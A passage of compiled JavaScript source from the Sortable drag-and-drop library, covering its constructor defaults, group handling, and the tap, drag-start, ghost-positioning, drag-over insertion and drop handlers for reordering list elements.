		} else if (typeof value === 'function') {
		  return toFn(value(to, from, dragEl, evt), pull)(to, from, dragEl, evt);
		} else {
		  var otherGroup = (pull ? to : from).options.group.name;
		  return value === true || typeof value === 'string' && value === otherGroup || value.join && value.indexOf(otherGroup) > -1;
		}
	  };
	}

	var group = {};
	var originalGroup = options.group;

	if (!originalGroup || _typeof(originalGroup) != 'object') {
	  originalGroup = {
		name: originalGroup
	  };
	}

	group.name = originalGroup.name;
	group.checkPull = toFn(originalGroup.pull, true);
	group.checkPut = toFn(originalGroup.put);
	group.revertClone = originalGroup.revertClone;
	options.group = group;
  },
	  _hideGhostForTarget = function _hideGhostForTarget() {
	if (!supportCssPointerEvents && ghostEl) {
	  css(ghostEl, 'display', 'none');
	}
  },
	  _unhideGhostForTarget = function _unhideGhostForTarget() {
	if (!supportCssPointerEvents && ghostEl) {
	  css(ghostEl, 'display', '');
	}
  }; // #1184 fix - Prevent click event on fallback if dragged but item not changed position


  if (documentExists) {
	document.addEventListener('click', function (evt) {
	  if (ignoreNextClick) {
		evt.preventDefault();
		evt.stopPropagation && evt.stopPropagation();
		evt.stopImmediatePropagation && evt.stopImmediatePropagation();
		ignoreNextClick = false;
		return false;
	  }
	}, true);
  }

  var nearestEmptyInsertDetectEvent = function nearestEmptyInsertDetectEvent(evt) {
	if (dragEl) {
	  evt = evt.touches ? evt.touches[0] : evt;

	  var nearest = _detectNearestEmptySortable(evt.clientX, evt.clientY);

	  if (nearest) {
		// Create imitation event
		var event = {};

		for (var i in evt) {
		  if (evt.hasOwnProperty(i)) {
			event[i] = evt[i];
		  }
		}

		event.target = event.rootEl = nearest;
		event.preventDefault = void 0;
		event.stopPropagation = void 0;

		nearest[expando]._onDragOver(event);
	  }
	}
  };

  var _checkOutsideTargetEl = function _checkOutsideTargetEl(evt) {
	if (dragEl) {
	  dragEl.parentNode[expando]._isOutsideThisEl(evt.target);
	}
  };
  /**
   * @class  Sortable
   * @param  {HTMLElement}  el
   * @param  {Object}       [options]
   */


  function Sortable(el, options) {
	if (!(el && el.nodeType && el.nodeType === 1)) {
	  throw "Sortable: `el` must be an HTMLElement, not ".concat({}.toString.call(el));
	}

	this.el = el; // root element

	this.options = options = _extends({}, options); // Export instance

	el[expando] = this;
	var defaults = {
	  group: null,
	  sort: true,
	  disabled: false,
	  store: null,
	  handle: null,
	  draggable: /^[uo]l$/i.test(el.nodeName) ? '>li' : '>*',
	  swapThreshold: 1,
	  // percentage; 0 <= x <= 1
	  invertSwap: false,
	  // invert always
	  invertedSwapThreshold: null,
	  // will be set to same as swapThreshold if default
	  removeCloneOnHide: true,
	  direction: function direction() {
		return _detectDirection(el, this.options);
	  },
	  ghostClass: 'sortable-ghost',
	  chosenClass: 'sortable-chosen',
	  dragClass: 'sortable-drag',
	  ignore: 'a, img',
	  filter: null,
	  preventOnFilter: true,
	  animation: 0,
	  easing: null,
	  setData: function setData(dataTransfer, dragEl) {
		dataTransfer.setData('Text', dragEl.textContent);
	  },
	  dropBubble: false,
	  dragoverBubble: false,
	  dataIdAttr: 'data-id',
	  delay: 0,
	  delayOnTouchOnly: false,
	  touchStartThreshold: (Number.parseInt ? Number : window).parseInt(window.devicePixelRatio, 10) || 1,
	  forceFallback: false,
	  fallbackClass: 'sortable-fallback',
	  fallbackOnBody: false,
	  fallbackTolerance: 0,
	  fallbackOffset: {
		x: 0,
		y: 0
	  },
	  supportPointer: Sortable.supportPointer !== false && 'PointerEvent' in window && !Safari,
	  emptyInsertThreshold: 5
	};
	PluginManager.initializePlugins(this, el, defaults); // Set default options

	for (var name in defaults) {
	  !(name in options) && (options[name] = defaults[name]);
	}

	_prepareGroup(options); // Bind all private methods


	for (var fn in this) {
	  if (fn.charAt(0) === '_' && typeof this[fn] === 'function') {
		this[fn] = this[fn].bind(this);
	  }
	} // Setup drag mode


	this.nativeDraggable = options.forceFallback ? false : supportDraggable;

	if (this.nativeDraggable) {
	  // Touch start threshold cannot be greater than the native dragstart threshold
	  this.options.touchStartThreshold = 1;
	} // Bind events


	if (options.supportPointer) {
	  on(el, 'pointerdown', this._onTapStart);
	} else {
	  on(el, 'mousedown', this._onTapStart);
	  on(el, 'touchstart', this._onTapStart);
	}

	if (this.nativeDraggable) {
	  on(el, 'dragover', this);
	  on(el, 'dragenter', this);
	}

	sortables.push(this.el); // Restore sorting

	options.store && options.store.get && this.sort(options.store.get(this) || []); // Add animation state manager

	_extends(this, AnimationStateManager());
  }

  Sortable.prototype =
  /** @lends Sortable.prototype */
  {
	constructor: Sortable,
	_isOutsideThisEl: function _isOutsideThisEl(target) {
	  if (!this.el.contains(target) && target !== this.el) {
		lastTarget = null;
	  }
	},
	_getDirection: function _getDirection(evt, target) {
	  return typeof this.options.direction === 'function' ? this.options.direction.call(this, evt, target, dragEl) : this.options.direction;
	},
	_onTapStart: function _onTapStart(
	/** Event|TouchEvent */
	evt) {
	  if (!evt.cancelable) return;

	  var _this = this,
		  el = this.el,
		  options = this.options,
		  preventOnFilter = options.preventOnFilter,
		  type = evt.type,
		  touch = evt.touches && evt.touches[0] || evt.pointerType && evt.pointerType === 'touch' && evt,
		  target = (touch || evt).target,
		  originalTarget = evt.target.shadowRoot && (evt.path && evt.path[0] || evt.composedPath && evt.composedPath()[0]) || target,
		  filter = options.filter;

	  _saveInputCheckedState(el); // Don't trigger start event when an element is been dragged, otherwise the evt.oldindex always wrong when set option.group.


	  if (dragEl) {
		return;
	  }

	  if (/mousedown|pointerdown/.test(type) && evt.button !== 0 || options.disabled) {
		return; // only left button and enabled
	  } // cancel dnd if original target is content editable


	  if (originalTarget.isContentEditable) {
		return;
	  } // Safari ignores further event handling after mousedown


	  if (!this.nativeDraggable && Safari && target && target.tagName.toUpperCase() === 'SELECT') {
		return;
	  }

	  target = closest(target, options.draggable, el, false);

	  if (target && target.animated) {
		return;
	  }

	  if (lastDownEl === target) {
		// Ignoring duplicate `down`
		return;
	  } // Get the index of the dragged element within its parent


	  oldIndex = index(target);
	  oldDraggableIndex = index(target, options.draggable); // Check filter

	  if (typeof filter === 'function') {
		if (filter.call(this, evt, target, this)) {
		  _dispatchEvent({
			sortable: _this,
			rootEl: originalTarget,
			name: 'filter',
			targetEl: target,
			toEl: el,
			fromEl: el
		  });

		  pluginEvent('filter', _this, {
			evt: evt
		  });
		  preventOnFilter && evt.cancelable && evt.preventDefault();
		  return; // cancel dnd
		}
	  } else if (filter) {
		filter = filter.split(',').some(function (criteria) {
		  criteria = closest(originalTarget, criteria.trim(), el, false);

		  if (criteria) {
			_dispatchEvent({
			  sortable: _this,
			  rootEl: criteria,
			  name: 'filter',
			  targetEl: target,
			  fromEl: el,
			  toEl: el
			});

			pluginEvent('filter', _this, {
			  evt: evt
			});
			return true;
		  }
		});

		if (filter) {
		  preventOnFilter && evt.cancelable && evt.preventDefault();
		  return; // cancel dnd
		}
	  }

	  if (options.handle && !closest(originalTarget, options.handle, el, false)) {
		return;
	  } // Prepare `dragstart`


	  this._prepareDragStart(evt, touch, target);
	},
	_prepareDragStart: function _prepareDragStart(
	/** Event */
	evt,
	/** Touch */
	touch,
	/** HTMLElement */
	target) {
	  var _this = this,
		  el = _this.el,
		  options = _this.options,
		  ownerDocument = el.ownerDocument,
		  dragStartFn;

	  if (target && !dragEl && target.parentNode === el) {
		var dragRect = getRect(target);
		rootEl = el;
		dragEl = target;
		parentEl = dragEl.parentNode;
		nextEl = dragEl.nextSibling;
		lastDownEl = target;
		activeGroup = options.group;
		Sortable.dragged = dragEl;
		tapEvt = {
		  target: dragEl,
		  clientX: (touch || evt).clientX,
		  clientY: (touch || evt).clientY
		};
		tapDistanceLeft = tapEvt.clientX - dragRect.left;
		tapDistanceTop = tapEvt.clientY - dragRect.top;
		this._lastX = (touch || evt).clientX;
		this._lastY = (touch || evt).clientY;
		dragEl.style['will-change'] = 'all';

		dragStartFn = function dragStartFn() {
		  pluginEvent('delayEnded', _this, {
			evt: evt
		  });

		  if (Sortable.eventCanceled) {
			_this._onDrop();

			return;
		  } // Delayed drag has been triggered
		  // we can re-enable the events: touchmove/mousemove


		  _this._disableDelayedDragEvents();

		  if (!FireFox && _this.nativeDraggable) {
			dragEl.draggable = true;
		  } // Bind the events: dragstart/dragend


		  _this._triggerDragStart(evt, touch); // Drag start event


		  _dispatchEvent({
			sortable: _this,
			name: 'choose',
			originalEvent: evt
		  }); // Chosen item


		  toggleClass(dragEl, options.chosenClass, true);
		}; // Disable "draggable"


		options.ignore.split(',').forEach(function (criteria) {
		  find(dragEl, criteria.trim(), _disableDraggable);
		});
		on(ownerDocument, 'dragover', nearestEmptyInsertDetectEvent);
		on(ownerDocument, 'mousemove', nearestEmptyInsertDetectEvent);
		on(ownerDocument, 'touchmove', nearestEmptyInsertDetectEvent);
		on(ownerDocument, 'mouseup', _this._onDrop);
		on(ownerDocument, 'touchend', _this._onDrop);
		on(ownerDocument, 'touchcancel', _this._onDrop); // Make dragEl draggable (must be before delay for FireFox)

		if (FireFox && this.nativeDraggable) {
		  this.options.touchStartThreshold = 4;
		  dragEl.draggable = true;
		}

		pluginEvent('delayStart', this, {
		  evt: evt
		}); // Delay is impossible for native DnD in Edge or IE

		if (options.delay && (!options.delayOnTouchOnly || touch) && (!this.nativeDraggable || !(Edge || IE11OrLess))) {
		  if (Sortable.eventCanceled) {
			this._onDrop();

			return;
		  } // If the user moves the pointer or let go the click or touch
		  // before the delay has been reached:
		  // disable the delayed drag


		  on(ownerDocument, 'mouseup', _this._disableDelayedDrag);
		  on(ownerDocument, 'touchend', _this._disableDelayedDrag);
		  on(ownerDocument, 'touchcancel', _this._disableDelayedDrag);
		  on(ownerDocument, 'mousemove', _this._delayedDragTouchMoveHandler);
		  on(ownerDocument, 'touchmove', _this._delayedDragTouchMoveHandler);
		  options.supportPointer && on(ownerDocument, 'pointermove', _this._delayedDragTouchMoveHandler);
		  _this._dragStartTimer = setTimeout(dragStartFn, options.delay);
		} else {
		  dragStartFn();
		}
	  }
	},
	_delayedDragTouchMoveHandler: function _delayedDragTouchMoveHandler(
	/** TouchEvent|PointerEvent **/
	e) {
	  var touch = e.touches ? e.touches[0] : e;

	  if (Math.max(Math.abs(touch.clientX - this._lastX), Math.abs(touch.clientY - this._lastY)) >= Math.floor(this.options.touchStartThreshold / (this.nativeDraggable && window.devicePixelRatio || 1))) {
		this._disableDelayedDrag();
	  }
	},
	_disableDelayedDrag: function _disableDelayedDrag() {
	  dragEl && _disableDraggable(dragEl);
	  clearTimeout(this._dragStartTimer);

	  this._disableDelayedDragEvents();
	},
	_disableDelayedDragEvents: function _disableDelayedDragEvents() {
	  var ownerDocument = this.el.ownerDocument;
	  off(ownerDocument, 'mouseup', this._disableDelayedDrag);
	  off(ownerDocument, 'touchend', this._disableDelayedDrag);
	  off(ownerDocument, 'touchcancel', this._disableDelayedDrag);
	  off(ownerDocument, 'mousemove', this._delayedDragTouchMoveHandler);
	  off(ownerDocument, 'touchmove', this._delayedDragTouchMoveHandler);
	  off(ownerDocument, 'pointermove', this._delayedDragTouchMoveHandler);
	},
	_triggerDragStart: function _triggerDragStart(
	/** Event */
	evt,
	/** Touch */
	touch) {
	  touch = touch || evt.pointerType == 'touch' && evt;

	  if (!this.nativeDraggable || touch) {
		if (this.options.supportPointer) {
		  on(document, 'pointermove', this._onTouchMove);
		} else if (touch) {
		  on(document, 'touchmove', this._onTouchMove);
		} else {
		  on(document, 'mousemove', this._onTouchMove);
		}
	  } else {
		on(dragEl, 'dragend', this);
		on(rootEl, 'dragstart', this._onDragStart);
	  }

	  try {
		if (document.selection) {
		  // Timeout neccessary for IE9
		  _nextTick(function () {
			document.selection.empty();
		  });
		} else {
		  window.getSelection().removeAllRanges();
		}
	  } catch (err) {}
	},
	_dragStarted: function _dragStarted(fallback, evt) {

	  awaitingDragStarted = false;

	  if (rootEl && dragEl) {
		pluginEvent('dragStarted', this, {
		  evt: evt
		});

		if (this.nativeDraggable) {
		  on(document, 'dragover', _checkOutsideTargetEl);
		}

		var options = this.options; // Apply effect

		!fallback && toggleClass(dragEl, options.dragClass, false);
		toggleClass(dragEl, options.ghostClass, true);
		Sortable.active = this;
		fallback && this._appendGhost(); // Drag start event

		_dispatchEvent({
		  sortable: this,
		  name: 'start',
		  originalEvent: evt
		});
	  } else {
		this._nulling();
	  }
	},
	_emulateDragOver: function _emulateDragOver() {
	  if (touchEvt) {
		this._lastX = touchEvt.clientX;
		this._lastY = touchEvt.clientY;

		_hideGhostForTarget();

		var target = document.elementFromPoint(touchEvt.clientX, touchEvt.clientY);
		var parent = target;

		while (target && target.shadowRoot) {
		  target = target.shadowRoot.elementFromPoint(touchEvt.clientX, touchEvt.clientY);
		  if (target === parent) break;
		  parent = target;
		}

		dragEl.parentNode[expando]._isOutsideThisEl(target);

		if (parent) {
		  do {
			if (parent[expando]) {
			  var inserted = void 0;
			  inserted = parent[expando]._onDragOver({
				clientX: touchEvt.clientX,
				clientY: touchEvt.clientY,
				target: target,
				rootEl: parent
			  });

			  if (inserted && !this.options.dragoverBubble) {
				break;
			  }
			}

			target = parent; // store last element
		  }
		  /* jshint boss:true */
		  while (parent = parent.parentNode);
		}

		_unhideGhostForTarget();
	  }
	},
	_onTouchMove: function _onTouchMove(
	/**TouchEvent*/
	evt) {
	  if (tapEvt) {
		var options = this.options,
			fallbackTolerance = options.fallbackTolerance,
			fallbackOffset = options.fallbackOffset,
			touch = evt.touches ? evt.touches[0] : evt,
			ghostMatrix = ghostEl && matrix(ghostEl, true),
			scaleX = ghostEl && ghostMatrix && ghostMatrix.a,
			scaleY = ghostEl && ghostMatrix && ghostMatrix.d,
			relativeScrollOffset = PositionGhostAbsolutely && ghostRelativeParent && getRelativeScrollOffset(ghostRelativeParent),
			dx = (touch.clientX - tapEvt.clientX + fallbackOffset.x) / (scaleX || 1) + (relativeScrollOffset ? relativeScrollOffset[0] - ghostRelativeParentInitialScroll[0] : 0) / (scaleX || 1),
			dy = (touch.clientY - tapEvt.clientY + fallbackOffset.y) / (scaleY || 1) + (relativeScrollOffset ? relativeScrollOffset[1] - ghostRelativeParentInitialScroll[1] : 0) / (scaleY || 1); // only set the status to dragging, when we are actually dragging

		if (!Sortable.active && !awaitingDragStarted) {
		  if (fallbackTolerance && Math.max(Math.abs(touch.clientX - this._lastX), Math.abs(touch.clientY - this._lastY)) < fallbackTolerance) {
			return;
		  }

		  this._onDragStart(evt, true);
		}

		if (ghostEl) {
		  if (ghostMatrix) {
			ghostMatrix.e += dx - (lastDx || 0);
			ghostMatrix.f += dy - (lastDy || 0);
		  } else {
			ghostMatrix = {
			  a: 1,
			  b: 0,
			  c: 0,
			  d: 1,
			  e: dx,
			  f: dy
			};
		  }

		  var cssMatrix = "matrix(".concat(ghostMatrix.a, ",").concat(ghostMatrix.b, ",").concat(ghostMatrix.c, ",").concat(ghostMatrix.d, ",").concat(ghostMatrix.e, ",").concat(ghostMatrix.f, ")");
		  css(ghostEl, 'webkitTransform', cssMatrix);
		  css(ghostEl, 'mozTransform', cssMatrix);
		  css(ghostEl, 'msTransform', cssMatrix);
		  css(ghostEl, 'transform', cssMatrix);
		  lastDx = dx;
		  lastDy = dy;
		  touchEvt = touch;
		}

		evt.cancelable && evt.preventDefault();
	  }
	},
	_appendGhost: function _appendGhost() {
	  // Bug if using scale(): https://stackoverflow.com/questions/2637058
	  // Not being adjusted for
	  if (!ghostEl) {
		var container = this.options.fallbackOnBody ? document.body : rootEl,
			rect = getRect(dragEl, true, PositionGhostAbsolutely, true, container),
			options = this.options; // Position absolutely

		if (PositionGhostAbsolutely) {
		  // Get relatively positioned parent
		  ghostRelativeParent = container;

		  while (css(ghostRelativeParent, 'position') === 'static' && css(ghostRelativeParent, 'transform') === 'none' && ghostRelativeParent !== document) {
			ghostRelativeParent = ghostRelativeParent.parentNode;
		  }

		  if (ghostRelativeParent !== document.body && ghostRelativeParent !== document.documentElement) {
			if (ghostRelativeParent === document) ghostRelativeParent = getWindowScrollingElement();
			rect.top += ghostRelativeParent.scrollTop;
			rect.left += ghostRelativeParent.scrollLeft;
		  } else {
			ghostRelativeParent = getWindowScrollingElement();
		  }

		  ghostRelativeParentInitialScroll = getRelativeScrollOffset(ghostRelativeParent);
		}

		ghostEl = dragEl.cloneNode(true);
		toggleClass(ghostEl, options.ghostClass, false);
		toggleClass(ghostEl, options.fallbackClass, true);
		toggleClass(ghostEl, options.dragClass, true);
		css(ghostEl, 'transition', '');
		css(ghostEl, 'transform', '');
		css(ghostEl, 'box-sizing', 'border-box');
		css(ghostEl, 'margin', 0);
		css(ghostEl, 'top', rect.top);
		css(ghostEl, 'left', rect.left);
		css(ghostEl, 'width', rect.width);
		css(ghostEl, 'height', rect.height);
		css(ghostEl, 'opacity', '0.8');
		css(ghostEl, 'position', PositionGhostAbsolutely ? 'absolute' : 'fixed');
		css(ghostEl, 'zIndex', '100000');
		css(ghostEl, 'pointerEvents', 'none');
		Sortable.ghost = ghostEl;
		container.appendChild(ghostEl); // Set transform-origin

		css(ghostEl, 'transform-origin', tapDistanceLeft / parseInt(ghostEl.style.width) * 100 + '% ' + tapDistanceTop / parseInt(ghostEl.style.height) * 100 + '%');
	  }
	},
	_onDragStart: function _onDragStart(
	/**Event*/
	evt,
	/**boolean*/
	fallback) {
	  var _this = this;

	  var dataTransfer = evt.dataTransfer;
	  var options = _this.options;
	  pluginEvent('dragStart', this, {
		evt: evt
	  });

	  if (Sortable.eventCanceled) {
		this._onDrop();

		return;
	  }

	  pluginEvent('setupClone', this);

	  if (!Sortable.eventCanceled) {
		cloneEl = clone(dragEl);
		cloneEl.draggable = false;
		cloneEl.style['will-change'] = '';

		this._hideClone();

		toggleClass(cloneEl, this.options.chosenClass, false);
		Sortable.clone = cloneEl;
	  } // #1143: IFrame support workaround


	  _this.cloneId = _nextTick(function () {
		pluginEvent('clone', _this);
		if (Sortable.eventCanceled) return;

		if (!_this.options.removeCloneOnHide) {
		  rootEl.insertBefore(cloneEl, dragEl);
		}

		_this._hideClone();

		_dispatchEvent({
		  sortable: _this,
		  name: 'clone'
		});
	  });
	  !fallback && toggleClass(dragEl, options.dragClass, true); // Set proper drop events

	  if (fallback) {
		ignoreNextClick = true;
		_this._loopId = setInterval(_this._emulateDragOver, 50);
	  } else {
		// Undo what was set in _prepareDragStart before drag started
		off(document, 'mouseup', _this._onDrop);
		off(document, 'touchend', _this._onDrop);
		off(document, 'touchcancel', _this._onDrop);

		if (dataTransfer) {
		  dataTransfer.effectAllowed = 'move';
		  options.setData && options.setData.call(_this, dataTransfer, dragEl);
		}

		on(document, 'drop', _this); // #1276 fix:

		css(dragEl, 'transform', 'translateZ(0)');
	  }

	  awaitingDragStarted = true;
	  _this._dragStartId = _nextTick(_this._dragStarted.bind(_this, fallback, evt));
	  on(document, 'selectstart', _this);
	  moved = true;

	  if (Safari) {
		css(document.body, 'user-select', 'none');
	  }
	},
	// Returns true - if no further action is needed (either inserted or another condition)
	_onDragOver: function _onDragOver(
	/**Event*/
	evt) {
	  var el = this.el,
		  target = evt.target,
		  dragRect,
		  targetRect,
		  revert,
		  options = this.options,
		  group = options.group,
		  activeSortable = Sortable.active,
		  isOwner = activeGroup === group,
		  canSort = options.sort,
		  fromSortable = putSortable || activeSortable,
		  vertical,
		  _this = this,
		  completedFired = false;

	  if (_silent) return;

	  function dragOverEvent(name, extra) {
		pluginEvent(name, _this, _objectSpread2({
		  evt: evt,
		  isOwner: isOwner,
		  axis: vertical ? 'vertical' : 'horizontal',
		  revert: revert,
		  dragRect: dragRect,
		  targetRect: targetRect,
		  canSort: canSort,
		  fromSortable: fromSortable,
		  target: target,
		  completed: completed,
		  onMove: function onMove(target, after) {
			return _onMove(rootEl, el, dragEl, dragRect, target, getRect(target), evt, after);
		  },
		  changed: changed
		}, extra));
	  } // Capture animation state


	  function capture() {
		dragOverEvent('dragOverAnimationCapture');

		_this.captureAnimationState();

		if (_this !== fromSortable) {
		  fromSortable.captureAnimationState();
		}
	  } // Return invocation when dragEl is inserted (or completed)


	  function completed(insertion) {
		dragOverEvent('dragOverCompleted', {
		  insertion: insertion
		});

		if (insertion) {
		  // Clones must be hidden before folding animation to capture dragRectAbsolute properly
		  if (isOwner) {
			activeSortable._hideClone();
		  } else {
			activeSortable._showClone(_this);
		  }

		  if (_this !== fromSortable) {
			// Set ghost class to new sortable's ghost class
			toggleClass(dragEl, putSortable ? putSortable.options.ghostClass : activeSortable.options.ghostClass, false);
			toggleClass(dragEl, options.ghostClass, true);
		  }

		  if (putSortable !== _this && _this !== Sortable.active) {
			putSortable = _this;
		  } else if (_this === Sortable.active && putSortable) {
			putSortable = null;
		  } // Animation


		  if (fromSortable === _this) {
			_this._ignoreWhileAnimating = target;
		  }

		  _this.animateAll(function () {
			dragOverEvent('dragOverAnimationComplete');
			_this._ignoreWhileAnimating = null;
		  });

		  if (_this !== fromSortable) {
			fromSortable.animateAll();
			fromSortable._ignoreWhileAnimating = null;
		  }
		} // Null lastTarget if it is not inside a previously swapped element


		if (target === dragEl && !dragEl.animated || target === el && !target.animated) {
		  lastTarget = null;
		} // no bubbling and not fallback


		if (!options.dragoverBubble && !evt.rootEl && target !== document) {
		  dragEl.parentNode[expando]._isOutsideThisEl(evt.target); // Do not detect for empty insert if already inserted


		  !insertion && nearestEmptyInsertDetectEvent(evt);
		}

		!options.dragoverBubble && evt.stopPropagation && evt.stopPropagation();
		return completedFired = true;
	  } // Call when dragEl has been inserted


	  function changed() {
		newIndex = index(dragEl);
		newDraggableIndex = index(dragEl, options.draggable);

		_dispatchEvent({
		  sortable: _this,
		  name: 'change',
		  toEl: el,
		  newIndex: newIndex,
		  newDraggableIndex: newDraggableIndex,
		  originalEvent: evt
		});
	  }

	  if (evt.preventDefault !== void 0) {
		evt.cancelable && evt.preventDefault();
	  }

	  target = closest(target, options.draggable, el, true);
	  dragOverEvent('dragOver');
	  if (Sortable.eventCanceled) return completedFired;

	  if (dragEl.contains(evt.target) || target.animated && target.animatingX && target.animatingY || _this._ignoreWhileAnimating === target) {
		return completed(false);
	  }

	  ignoreNextClick = false;

	  if (activeSortable && !options.disabled && (isOwner ? canSort || (revert = parentEl !== rootEl) // Reverting item into the original list
	  : putSortable === this || (this.lastPutMode = activeGroup.checkPull(this, activeSortable, dragEl, evt)) && group.checkPut(this, activeSortable, dragEl, evt))) {
		vertical = this._getDirection(evt, target) === 'vertical';
		dragRect = getRect(dragEl);
		dragOverEvent('dragOverValid');
		if (Sortable.eventCanceled) return completedFired;

		if (revert) {
		  parentEl = rootEl; // actualization

		  capture();

		  this._hideClone();

		  dragOverEvent('revert');

		  if (!Sortable.eventCanceled) {
			if (nextEl) {
			  rootEl.insertBefore(dragEl, nextEl);
			} else {
			  rootEl.appendChild(dragEl);
			}
		  }

		  return completed(true);
		}

		var elLastChild = lastChild(el, options.draggable);

		if (!elLastChild || _ghostIsLast(evt, vertical, this) && !elLastChild.animated) {
		  // Insert to end of list
		  // If already at end of list: Do not insert
		  if (elLastChild === dragEl) {
			return completed(false);
		  } // if there is a last element, it is the target


		  if (elLastChild && el === evt.target) {
			target = elLastChild;
		  }

		  if (target) {
			targetRect = getRect(target);
		  }

		  if (_onMove(rootEl, el, dragEl, dragRect, target, targetRect, evt, !!target) !== false) {
			capture();
			el.appendChild(dragEl);
			parentEl = el; // actualization

			changed();
			return completed(true);
		  }
		} else if (elLastChild && _ghostIsFirst(evt, vertical, this)) {
		  // Insert to start of list
		  var firstChild = getChild(el, 0, options, true);

		  if (firstChild === dragEl) {
			return completed(false);
		  }

		  target = firstChild;
		  targetRect = getRect(target);

		  if (_onMove(rootEl, el, dragEl, dragRect, target, targetRect, evt, false) !== false) {
			capture();
			el.insertBefore(dragEl, firstChild);
			parentEl = el; // actualization

			changed();
			return completed(true);
		  }
		} else if (target.parentNode === el) {
		  targetRect = getRect(target);
		  var direction = 0,
			  targetBeforeFirstSwap,
			  differentLevel = dragEl.parentNode !== el,
			  differentRowCol = !_dragElInRowColumn(dragEl.animated && dragEl.toRect || dragRect, target.animated && target.toRect || targetRect, vertical),
			  side1 = vertical ? 'top' : 'left',
			  scrolledPastTop = isScrolledPast(target, 'top', 'top') || isScrolledPast(dragEl, 'top', 'top'),
			  scrollBefore = scrolledPastTop ? scrolledPastTop.scrollTop : void 0;

		  if (lastTarget !== target) {
			targetBeforeFirstSwap = targetRect[side1];
			pastFirstInvertThresh = false;
			isCircumstantialInvert = !differentRowCol && options.invertSwap || differentLevel;
		  }

		  direction = _getSwapDirection(evt, target, targetRect, vertical, differentRowCol ? 1 : options.swapThreshold, options.invertedSwapThreshold == null ? options.swapThreshold : options.invertedSwapThreshold, isCircumstantialInvert, lastTarget === target);
		  var sibling;

		  if (direction !== 0) {
			// Check if target is beside dragEl in respective direction (ignoring hidden elements)
			var dragIndex = index(dragEl);

			do {
			  dragIndex -= direction;
			  sibling = parentEl.children[dragIndex];
			} while (sibling && (css(sibling, 'display') === 'none' || sibling === ghostEl));
		  } // If dragEl is already beside target: Do not insert


		  if (direction === 0 || sibling === target) {
			return completed(false);
		  }

		  lastTarget = target;
		  lastDirection = direction;
		  var nextSibling = target.nextElementSibling,
			  after = false;
		  after = direction === 1;

		  var moveVector = _onMove(rootEl, el, dragEl, dragRect, target, targetRect, evt, after);

		  if (moveVector !== false) {
			if (moveVector === 1 || moveVector === -1) {
			  after = moveVector === 1;
			}

			_silent = true;
			setTimeout(_unsilent, 30);
			capture();

			if (after && !nextSibling) {
			  el.appendChild(dragEl);
			} else {
			  target.parentNode.insertBefore(dragEl, after ? nextSibling : target);
			} // Undo chrome's scroll adjustment (has no effect on other browsers)


			if (scrolledPastTop) {
			  scrollBy(scrolledPastTop, 0, scrollBefore - scrolledPastTop.scrollTop);
			}

			parentEl = dragEl.parentNode; // actualization
			// must be done before animation

			if (targetBeforeFirstSwap !== undefined && !isCircumstantialInvert) {
			  targetMoveDistance = Math.abs(targetBeforeFirstSwap - getRect(target)[side1]);
			}

			changed();
			return completed(true);
		  }
		}

		if (el.contains(dragEl)) {
		  return completed(false);
		}
	  }

	  return false;
	},
	_ignoreWhileAnimating: null,
	_offMoveEvents: function _offMoveEvents() {
	  off(document, 'mousemove', this._onTouchMove);
	  off(document, 'touchmove', this._onTouchMove);
	  off(document, 'pointermove', this._onTouchMove);
	  off(document, 'dragover', nearestEmptyInsertDetectEvent);
	  off(document, 'mousemove', nearestEmptyInsertDetectEvent);
	  off(document, 'touchmove', nearestEmptyInsertDetectEvent);
	},
	_offUpEvents: function _offUpEvents() {
	  var ownerDocument = this.el.ownerDocument;
	  off(ownerDocument, 'mouseup', this._onDrop);
	  off(ownerDocument, 'touchend', this._onDrop);
	  off(ownerDocument, 'pointerup', this._onDrop);
	  off(ownerDocument, 'touchcancel', this._onDrop);
	  off(document, 'selectstart', this);
	},
	_onDrop: function _onDrop(
	/**Event*/
	evt) {
	  var el = this.el,
		  options = this.options; // Get the index of the dragged element within its parent

	  newIndex = index(dragEl);
	  newDraggableIndex = index(dragEl, options.draggable);
	  pluginEvent('drop', this, {
		evt: evt
	  });
	  parentEl = dragEl && dragEl.parentNode; // Get again after plugin event

	  newIndex = index(dragEl);
	  newDraggableIndex = index(dragEl, options.draggable);

	  if (Sortable.eventCanceled) {
		this._nulling();

		return;
	  }

	  awaitingDragStarted = false;
	  isCircumstantialInvert = false;
	  pastFirstInvertThresh = false;
	  clearInterval(this._loopId);
	  clearTimeout(this._dragStartTimer);

	  _cancelNextTick(this.cloneId);

	  _cancelNextTick(this._dragStartId); // Unbind events


	  if (this.nativeDraggable) {
		off(document, 'drop', this);
		off(el, 'dragstart', this._onDragStart);
	  }

	  this._offMoveEvents();

	  this._offUpEvents();

	  if (Safari) {
		css(document.body, 'user-select', '');
	  }

	  css(dragEl, 'transform', '');

	  if (evt) {
		if (moved) {
		  evt.cancelable && evt.preventDefault();
		  !options.dropBubble && evt.stopPropagation();
		}

		ghostEl && ghostEl.parentNode && ghostEl.parentNode.removeChild(ghostEl);

		if (rootEl === parentEl || putSortable && putSortable.lastPutMode !== 'clone') {
		  // Remove clone(s)
		  cloneEl && cloneEl.parentNode && cloneEl.parentNode.removeChild(cloneEl);
		}

		if (dragEl) {
		  if (this.nativeDraggable) {
			off(dragEl, 'dragend', this);
		  }

		  _disableDraggable(dragEl);

		  dragEl.style['will-change'] = ''; // Remove classes
		  // ghostClass is added in dragStarted

		  if (moved && !awaitingDragStarted) {
			toggleClass(dragEl, putSortable ? putSortable.options.ghostClass : this.options.ghostClass, false);
		  }

		  toggleClass(dragEl, this.options.chosenClass, false); // Drag stop event

		  _dispatchEvent({
			sortable: this,
			name: 'unchoose',
			toEl: parentEl,
			newIndex: null,
			newDraggableIndex: null,
			originalEvent: evt
		  });

		  if (rootEl !== parentEl) {
			if (newIndex >= 0) {
			  // Add event
			  _dispatchEvent({
				rootEl: parentEl,
				name: 'add',
				toEl: parentEl,
				fromEl: rootEl,
				originalEvent: evt
			  }); // Remove event


			  _dispatchEvent({
				sortable: this,
				name: 'remove',
				toEl: parentEl,
				originalEvent: evt
			  }); // drag from one list and drop into another


			  _dispatchEvent({
				rootEl: parentEl,
				name: 'sort',
				toEl: parentEl,
				fromEl: rootEl,
				originalEvent: evt
			  });

			  _dispatchEvent({
				sortable: this,
				name: 'sort',
				toEl: parentEl,
				originalEvent: evt
			  });
			}

			putSortable && putSortable.save();
		  } else {
			if (newIndex !== oldIndex) {
			  if (newIndex >= 0) {
				// drag & drop within the same list
				_dispatchEvent({
				  sortable: this,
				  name: 'update',
				  toEl: parentEl,
				  originalEvent: evt
				});

				_dispatchEvent({
				  sortable: this,
				  name: 'sort',
				  toEl: parentEl,
				  originalEvent: evt
				});
			  }
			}
		  }

		  if (Sortable.active) {
